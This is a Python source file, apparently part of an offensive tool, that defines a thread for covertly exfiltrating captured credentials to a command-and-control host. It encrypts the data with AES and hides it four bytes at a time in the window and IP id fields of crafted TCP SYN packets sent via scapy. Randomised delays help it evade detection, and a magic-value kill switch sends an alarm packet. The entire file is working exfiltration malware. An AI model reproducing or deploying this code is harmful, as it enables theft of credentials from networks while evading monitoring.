import threading
import time
import random
import pyaes
import pyscrypt
import logging
from scapy.all import *

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "2.020"


class ExfilTCP(threading.Thread):
    def __init__(self, args, conf):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.q, self.port = args
        self.magic = conf['MAGIC']
        self.ip = conf['IP']
        self.swmac = conf['SWMAC']
        self.gwmac = conf['GWMAC']
        self.cchost = conf['CCHOST']
        self.iface = conf['IFACE']
        self.phrase = conf['PHRASE']
        self.salt = conf['SALT']
        self.seed1 = int(conf['SEED1'])
        self.seed2 = int(conf['SEED2'])
        self.seed3 = int(conf['SEED3'])
        self.debug = conf['DEBUG']
        if conf['DEBUG']:
            logging.basicConfig(level=logging.DEBUG)

    def run(self):
        while not self.stoprequest.isSet():
            data = self.q.get()
            if data:
                # Kill Switch
                if data == self.magic:
                    self.alarm()
                    self.stoprequest.set()
                else:
                    # encrypt and split into 4 bytes
                    cry = self.encrypt(data)
                    ar = [cry[i:i+4] for i in range(0, len(cry), 4)]
                    if len(cry) % 4 != 0:
                        for x in range(4-len(ar[len(ar)-1])):
                            ar[len(ar)-1] = ar[len(ar)-1] + '0'

                    # HTTP/S exfiltration
                    # We don't neeed a fully TCP/3WAY, just a few SYN
                    # packets. As before, [IP].id used for crypto len &
                    # amount of pkt. The crypto payload split / 4
                    # (16bits each) hidden on [TCP].window field

                    logging.debug('Sending credentials via TCP {}'.format(self.port))
                    # craft packet
                    tcppkt = (Ether(src=self.swmac, dst=self.gwmac) /
                               IP(ihl=5,
                                  flags='DF',
                                  src=self.ip,
                                  dst=self.cchost) /
                               TCP(sport=random.randint(3025, 38000),
                                   dport=self.port,
                                   ack=0,
                                   dataofs=10,
                                   reserved=0,
                                   flags='S',
                                   urgptr=0))
                    tcppkt[TCP].options = [('MSS', 1460),
                                           ('SAckOK', ''),
                                           ('Timestamp',
                                           (int(time.time()), 0)),
                                           ('NOP', None),
                                           ('WScale', 6)]
                    tcppkt[TCP].seq = random.randint(1000000000, 1800000000)
                    tcppkt[TCP].window = random.randint(30000, 40000)

                    # first pkt (crypto len)
                    tcppkt[IP].id = self.seed1 + len(cry)
                    sendp(tcppkt, iface=self.iface, verbose=0)

                    # random delay
                    if self.debug:
                        time.sleep(1)
                    else:
                        time.sleep(random.randint(1, 30))

                    # second pkt (amount of pkts)
                    tcppkt[IP].id = self.seed2 + len(ar)
                    sendp(tcppkt, iface=self.iface, verbose=0)

                    # random delay
                    if self.debug:
                        time.sleep(1)
                    else:
                        time.sleep(random.randint(1, 30))

                    # payload pkts
                    for x in range(len(ar)):
                        tcppkt[IP].id = self.seed3 + x
                        tcppkt[TCP].window = int(ar[x], 16)
                        sendp(tcppkt, iface=self.iface, verbose=0)
                        # random delay
                        if self.debug:
                            time.sleep(1)
                        else:
                            time.sleep(random.randint(1, 30))

    # AES crypto
    def encrypt(self, cleartxt):
        key = pyscrypt.hash(self.phrase.encode(), self.salt.encode(), 1024, 1, 1, 16)
        aes = pyaes.AESModeOfOperationCTR(key)
        ciphertxt = aes.encrypt(cleartxt.encode())
        return ciphertxt.hex()

    # Alarm Funtion
    def alarm(self):
        alarmpkt = (Ether(src=self.swmac, dst=self.gwmac) /
                   IP(ihl=5,
                      flags='DF',
                      src=self.ip,
                      dst=self.cchost,
                      id=int(self.magic)) /
                   TCP(sport=random.randint(3025, 38000),
                       dport=self.port,
                       ack=0,
                       dataofs=10,
                       reserved=0,
                       flags='S',
                       urgptr=0))
        alarmpkt[TCP].options = [('MSS', 1460),
                               ('SAckOK', ''),
                               ('Timestamp',
                               (int(time.time()), 0)),
                               ('NOP', None),
                               ('WScale', 6)]
        alarmpkt[TCP].seq = random.randint(1000000000, 1800000000)
        alarmpkt[TCP].window = random.randint(30000, 40000)
        sendp(alarmpkt, iface=self.iface, verbose=0)

    # Stop Function
    def join(self):
        self.stoprequest.set()
